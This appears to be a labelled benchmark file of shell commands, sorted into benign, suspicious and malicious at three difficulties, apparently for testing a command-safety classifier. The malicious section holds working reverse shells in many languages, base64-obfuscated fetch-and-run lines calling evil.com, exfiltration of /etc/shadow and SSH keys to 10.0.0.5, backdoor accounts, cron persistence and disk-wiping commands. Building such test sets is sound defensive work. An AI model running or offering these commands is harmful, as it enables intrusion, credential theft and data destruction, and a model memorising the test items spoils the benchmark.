@@ -1,0 +1,215 @@
+# ══════════════════════════════════════════════════════════════════════════════
+# GENOS ADVERSARIAL BENCHMARK — Edge Cases That Break Classification
+# 3 difficulties × 3 labels = 9 cells, ~20 commands each ≈ 180 commands
+# Focus: decision boundary exploitation, regex gaps, routing logic edge cases
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ═════════════════════════════════════════════════════════════════════════════
+# BENIGN — Commands that ARE safe but look dangerous
+# ═════════════════════════════════════════════════════════════════════════════
+
+# --- EASY (benign) --- Everyday ops with superficially scary tokens
+easy|benign|cat /etc/passwd
+easy|benign|file /bin/ls
+easy|benign|file /usr/bin/ssh
+easy|benign|md5sum /etc/passwd
+easy|benign|sha256sum /bin/bash
+easy|benign|sha256sum /usr/sbin/sshd
+easy|benign|stat /etc/shadow
+easy|benign|ls -la /root
+easy|benign|wc -l /var/log/auth.log
+easy|benign|head -5 /etc/sudoers
+easy|benign|grep -c "bash" /etc/passwd
+easy|benign|diff /etc/passwd /etc/passwd.bak
+easy|benign|ip route
+easy|benign|cat /proc/version
+easy|benign|file /tmp/cli.tar.gz
+easy|benign|find /var/tmp -maxdepth 1 -type f | head -20
+easy|benign|find /var/log -maxdepth 1 -type f | head -20
+easy|benign|find /home/dev -maxdepth 1 -type f | head -20
+easy|benign|ss -tlnp | grep 443
+easy|benign|lsof -i :22
+
+# --- MEDIUM (benign) --- Admin workflows with sensitive paths/tools
+medium|benign|find /etc -name "*.pem" -o -name "*.crt"
+medium|benign|find /etc/ssl -maxdepth 2 -type f 2>/dev/null | head -50
+medium|benign|find /home/dev/.ssh -maxdepth 2 -type f 2>/dev/null | head -50
+medium|benign|find /home/dev/.ssh -type f -exec chmod 600 {} +
+medium|benign|find /etc/nginx -type f -exec chmod 640 {} +
+medium|benign|openssl x509 -in /etc/ssl/certs/company.pem -noout -enddate
+medium|benign|openssl s_client -connect google.com:443 -servername google.com </dev/null 2>/dev/null | openssl x509 -noout -dates
+medium|benign|tar czf /tmp/nginx-snapshot.tgz /var/log/nginx 2>/dev/null
+medium|benign|tar czf /tmp/config-snapshot.tgz /srv/app/config 2>/dev/null
+medium|benign|zip -r /tmp/config-backup.zip /etc/nginx /etc/systemd/system
+medium|benign|rsync -avz /var/log/nginx/ backup@10.0.0.20:/srv/backups/nginx-logs/
+medium|benign|rsync -avz /var/log/app backup@10.0.0.90:/srv/incident/app-logs/
+medium|benign|scp /var/log/nginx/access.log backup@10.0.0.20:/srv/incident-logs/
+medium|benign|scp /etc/ssl/certs/company.pem audit@10.0.0.50:/srv/cert-audit/
+medium|benign|kubectl exec deploy/web -- sh -c "tar cz /var/log/app" > /tmp/web-logs.tar.gz
+medium|benign|curl -fsSL https://packages.redhat.com/repodata/repomd.xml -o /tmp/repomd.xml
+medium|benign|curl -fsSL https://artifacts.company.local/ops/tool.deb -o /tmp/tool.deb
+medium|benign|wget -q https://artifacts.company.local/agent/agent-1.2.3.rpm -O /tmp/agent.rpm
+medium|benign|ssh support@10.0.0.61 "journalctl -u app --since today | tail -100"
+medium|benign|ssh support@10.0.0.61 "tar cz /var/log/app" > /tmp/10.0.0.61-app-logs.tgz
+
+# --- HARD (benign) --- Looks very suspicious but is legitimate admin work
+hard|benign|strace -tt -p $(pgrep nginx) -o /tmp/nginx.strace
+hard|benign|strace -tt -p $(pgrep postgres) -o /tmp/postgres.strace
+hard|benign|strace -ff -p $(pgrep dockerd) -o /tmp/dockerd.trace
+hard|benign|strace -p 1 -e trace=read
+hard|benign|ltrace -p $(pgrep nginx) -o /tmp/nginx-debug.ltrace
+hard|benign|ltrace -p $(pgrep postgres) -o /tmp/postgres.ltrace
+hard|benign|gdb -p $(pgrep apache2) --batch -ex "info proc mappings"
+hard|benign|gdb -batch -p $(pgrep postgres) -ex "generate-core-file /tmp/postgres.core"
+hard|benign|rsync -avz /etc/ssh audit@10.0.0.70:/srv/review/ssh/
+hard|benign|rsync -avz /home/dev/.ssh backup@10.0.0.91:/srv/incident/dev-ssh/
+hard|benign|tar cz /etc/ssh | ssh audit@10.0.0.70 "cat > /srv/staging/ssh.tgz"
+hard|benign|scp /var/log/auth.log audit@10.0.0.15:/tmp/
+hard|benign|kubectl get secrets -A
+hard|benign|kubectl exec deploy/api -- env | grep -i token
+hard|benign|kubectl cp kube-system/coredns-0:/etc/coredns/Corefile ./Corefile
+hard|benign|crontab -l -u root
+hard|benign|find /etc/kubernetes -maxdepth 2 -type f 2>/dev/null | head -50
+hard|benign|cat /etc/sudoers 2>/dev/null
+hard|benign|getfacl /etc/shadow
+hard|benign|stat /proc/sys/kernel/randomize_va_space
+
+# ═════════════════════════════════════════════════════════════════════════════
+# SUSPICIOUS — Dual-use commands, recon, enumeration, risky but not attack
+# ═════════════════════════════════════════════════════════════════════════════
+
+# --- EASY (suspicious) --- Common recon / enumeration
+easy|suspicious|nmap -sn 192.168.1.0/24
+easy|suspicious|nmap -p 22,80,443 10.0.0.0/24
+easy|suspicious|nc -zv 10.0.0.5 1-1024
+easy|suspicious|curl http://169.254.169.254/latest/meta-data/
+easy|suspicious|cat /etc/shadow
+easy|suspicious|find / -perm -4000 -type f 2>/dev/null
+easy|suspicious|find / -writable -type d 2>/dev/null
+easy|suspicious|wget http://10.0.0.5:8000/linpeas.sh -O /tmp/linpeas.sh
+easy|suspicious|tcpdump -i eth0 -w /tmp/capture.pcap
+easy|suspicious|tcpdump -i eth0 port 22 -w /tmp/ssh.pcap
+easy|suspicious|chisel client 10.0.0.1:8080 R:1080:socks
+easy|suspicious|ssh -D 1080 -fNq user@10.0.0.1
+easy|suspicious|getfacl /etc/shadow 2>/dev/null
+easy|suspicious|cat /etc/sudoers 2>/dev/null
+easy|suspicious|crontab -l 2>/dev/null; ls -la /etc/cron*
+easy|suspicious|id; whoami; uname -a; cat /etc/os-release
+easy|suspicious|compgen -c | grep -i "python\|perl\|ruby\|gcc\|make"
+easy|suspicious|find /home -name ".bash_history" -exec cat {} \; 2>/dev/null
+easy|suspicious|docker inspect --format '{{.Config.Env}}' $(docker ps -q)
+easy|suspicious|mount | grep -E "nosuid|noexec"
+
+# --- MEDIUM (suspicious) --- Deeper recon, staging, credential search
+medium|suspicious|find /etc -type f -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+medium|suspicious|find /srv -type f -name "*.conf" -exec grep -l "apikey" {} \; 2>/dev/null
+medium|suspicious|find /opt -type f -name "*.conf" -exec grep -l "credential" {} \; 2>/dev/null
+medium|suspicious|find /home -name ".ssh" -type d 2>/dev/null
+medium|suspicious|find /home -name "id_rsa" -type f 2>/dev/null
+medium|suspicious|find /etc/ssh -maxdepth 2 -type f 2>/dev/null | head -20
+medium|suspicious|tar czf /tmp/root-home.tgz /root 2>/dev/null
+medium|suspicious|tar czf /tmp/ssh-stage.tgz /etc/ssh 2>/dev/null
+medium|suspicious|tar czf /tmp/ssl-snapshot.tgz /etc/ssl 2>/dev/null
+medium|suspicious|tar czf /tmp/root-ssh-audit.tgz /root/.ssh 2>/dev/null
+medium|suspicious|openssl s_client -connect 10.0.0.5:4444 -quiet
+medium|suspicious|kubectl exec deploy/web -- sh -c "env | grep -i token"
+medium|suspicious|scp /etc/hostname audit@10.0.0.15:/tmp/
+medium|suspicious|scp /var/log/auth.log operator@10.0.0.15:/tmp/
+medium|suspicious|nmap -sV --script=http-enum 10.0.0.0/24
+medium|suspicious|for port in 21 22 80 443 3306 5432 8080; do nc -zv 10.0.0.5 $port 2>&1; done
+medium|suspicious|grep -rn "password\|secret\|api_key\|token" /etc/ 2>/dev/null | head -50
+medium|suspicious|ps aux | grep -v grep | awk '{print $1,$11}' | sort -u
+medium|suspicious|ss -ap | grep ESTAB | awk '{print $5}' | sort -u
+medium|suspicious|docker exec web env | grep -iE "password|secret|token|key"
+
+# --- HARD (suspicious) --- Advanced recon, polymorphic enumeration, staging
+hard|suspicious|python3 -c "import os; [print(f) for f in os.listdir('/etc/ssh')]"
+hard|suspicious|ruby -e 'Dir["/home/*/.ssh/*"].each{|f| puts f}'
+hard|suspicious|perl -e 'foreach(glob("/etc/ssh/*")){print "$_\n"}'
+hard|suspicious|awk 'BEGIN{while(("find /etc -name *.key" | getline f)>0) print f}'
+hard|suspicious|tar czf /tmp/.ssh-stage.tgz /root/.ssh 2>/dev/null
+hard|suspicious|tar czf /tmp/config-stage.tgz /srv/app/config 2>/dev/null
+hard|suspicious|tar czf /tmp/system-stage.tgz /etc/systemd/system 2>/dev/null
+hard|suspicious|kubectl exec deploy/web -- sh -c "tar cz /var/run/secrets" > /tmp/pod-secrets.tgz
+hard|suspicious|kubectl exec deploy/api -- sh -c "tar cz /etc/ssl /app/config" > /tmp/api-config.tgz
+hard|suspicious|rsync -avz /etc/ssl audit@10.0.0.99:/srv/audit/ssl/ 2>/dev/null
+hard|suspicious|rsync -avz /home/dev/.ssh audit@10.0.0.99:/srv/audit/.ssh/ 2>/dev/null
+hard|suspicious|curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | jq .
+hard|suspicious|for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done
+hard|suspicious|find / -name "*.log" -newer /tmp/timestamp -exec grep -l "error\|fail\|denied" {} \; 2>/dev/null
+hard|suspicious|python3 -c "import subprocess; print(subprocess.check_output(['ss','-tlnp']).decode())"
+hard|suspicious|ls -laR /proc/*/fd 2>/dev/null | grep socket | head -50
+hard|suspicious|cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
+hard|suspicious|dd if=/dev/sda bs=512 count=1 2>/dev/null | xxd | head -20
+hard|suspicious|strace -ff -p $(pgrep dockerd) -o /tmp/dockerd.trace -e trace=open,read,write
+hard|suspicious|nsenter -t 1 -m -u -i -n -p -- cat /etc/hostname
+
+# ═════════════════════════════════════════════════════════════════════════════
+# MALICIOUS — Unambiguous attacks, some using uncommon/evasive techniques
+# ═════════════════════════════════════════════════════════════════════════════
+
+# --- EASY (malicious) --- Clear attacks, standard patterns
+easy|malicious|bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+easy|malicious|nc -e /bin/bash 10.0.0.5 4444
+easy|malicious|curl http://evil.com/shell.sh | bash
+easy|malicious|wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd
+easy|malicious|python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+easy|malicious|echo "* * * * * /tmp/backdoor" | crontab -
+easy|malicious|chmod u+s /usr/bin/find
+easy|malicious|useradd -u 0 -o -g root -M -s /bin/bash rootkit
+easy|malicious|echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+easy|malicious|dd if=/dev/zero of=/dev/sda bs=1M
+easy|malicious|mkfs.ext4 /dev/sda1
+easy|malicious|iptables -F && ufw disable
+easy|malicious|systemctl stop auditd && auditctl -e 0
+easy|malicious|rm -rf / --no-preserve-root
+easy|malicious|hydra -l admin -P /tmp/passwords.txt ssh://10.0.0.5
+easy|malicious|sqlmap -u "http://10.0.0.5/login?id=1" --dbs
+easy|malicious|mimikatz.exe privilege::debug sekurlsa::logonpasswords
+easy|malicious|hashcat -m 1800 /tmp/shadow.hash /tmp/rockyou.txt
+easy|malicious|responder -I eth0 -wrf
+easy|malicious|crackmapexec smb 10.0.0.0/24 -u admin -p password123
+
+# --- MEDIUM (malicious) --- Encoded payloads, chained attacks, evasion
+medium|malicious|echo "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d | bash
+medium|malicious|python3 -c "import base64,os;os.system(base64.b64decode('Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=').decode())"
+medium|malicious|perl -MMIME::Base64 -e 'system(decode_base64("Y3VybCBodHRwOi8vZXZpbC5jb20vc2g="))'
+medium|malicious|mshta http://evil.com/payload.hta
+medium|malicious|LD_PRELOAD=/tmp/evil.so /usr/sbin/sshd
+medium|malicious|usermod -aG sudo backdoor
+medium|malicious|passwd -d root
+medium|malicious|echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+medium|malicious|wipefs -a /dev/sdb
+medium|malicious|userdel -r admin
+medium|malicious|pkill -9 sshd
+medium|malicious|kill -9 1
+medium|malicious|shred -u /etc/passwd
+medium|malicious|truncate -s 0 /var/log/auth.log
+medium|malicious|wget -q http://10.0.0.11:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
+medium|malicious|tar czf /tmp/loot.tgz /etc /root /home 2>/dev/null
+medium|malicious|rsync -avz /etc/ssh/ user@10.0.0.5:/srv/.cache/ssh/
+medium|malicious|tar cz /home/*/.ssh 2>/dev/null | curl -X PUT http://10.0.0.5:8080/store/.ssh.tgz
+medium|malicious|docker exec web sh -c "tar cz /app/.env /app/config" | nc 10.0.0.1 4444
+medium|malicious|cat /etc/shadow | nc 10.0.0.5 4444
+
+# --- HARD (malicious) --- Uncommon shells, evasive exfil, novel attack vectors
+hard|malicious|exec 3<>/dev/tcp/10.0.0.5/4444; cat <&3 | bash >&3 2>&3
+hard|malicious|socat TCP:10.0.0.5:4444 EXEC:/bin/bash,pty,stderr,setsid
+hard|malicious|perl -e 'use Socket;$i="10.0.0.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i")'
+hard|malicious|ruby -rsocket -e 'f=TCPSocket.open("10.0.0.5",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
+hard|malicious|php -r '$sock=fsockopen("10.0.0.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+hard|malicious|lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.5','4444');os.execute('/bin/bash -i <&3 >&3 2>&3')"
+hard|malicious|printf '%s\n' '#!/bin/bash' 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /tmp/.x && chmod +x /tmp/.x && /tmp/.x
+hard|malicious|python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjAuMC41Jyw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9iYXNoJywnLWknXSk='))"
+hard|malicious|echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' | base64 | xargs -I {} bash -c 'echo {} | base64 -d | bash'
+hard|malicious|EDITOR='vi -c ":!bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" -c ":q!"' crontab -e
+hard|malicious|find / -name shadow -exec sh -c 'cat {} | curl -X POST -d @- http://10.0.0.5:8080/exfil' \;
+hard|malicious|dd if=/etc/shadow bs=4096 | curl -X POST -d @- http://10.0.0.5:8080/exfil
+hard|malicious|openssl s_client -connect 10.0.0.5:4444 -quiet < /etc/shadow
+hard|malicious|tar cz /etc/shadow /root/.ssh 2>/dev/null | openssl enc -aes-256-cbc -pass pass:exfil | curl -X POST --data-binary @- http://10.0.0.5/drop
+hard|malicious|python3 -c "import urllib.request; urllib.request.urlopen('http://10.0.0.5:8080/'+open('/etc/shadow').read())"
+hard|malicious|nohup bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done' &
+hard|malicious|cp /bin/bash /tmp/.hidden && chmod u+s /tmp/.hidden
+hard|malicious|echo '#!/bin/bash\nnc -e /bin/bash 10.0.0.5 4444' > /etc/cron.daily/updater && chmod +x /etc/cron.daily/updater
+hard|malicious|setcap cap_setuid+ep /usr/bin/python3
+hard|malicious|ln -sf /bin/bash /usr/local/bin/nologin
